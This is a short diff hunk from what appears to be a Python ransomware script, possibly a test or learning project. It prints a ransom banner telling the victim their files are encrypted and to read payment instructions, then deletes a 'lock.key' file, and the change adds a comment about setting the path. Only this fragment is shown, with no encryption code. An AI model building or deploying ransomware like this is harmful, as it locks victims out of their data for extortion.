@@ -41,7 +41,7 @@ print ('''
 ATTENTION!!!.. All your files has been encrypted by our Ransomware. You are victim 0101. Read the payment_instructions file for more details....ATTENTION!!!
 
 ''')
-filepath = "\Ishola Francis Ayinde\Python files\Test_Files\lock.key"
+filepath = "\Ishola Francis Ayinde\Python files\Test_Files\lock.key" ##Replace with actual directory where the ransomware program is being run.
 
 try:
 	os.remove(filepath)
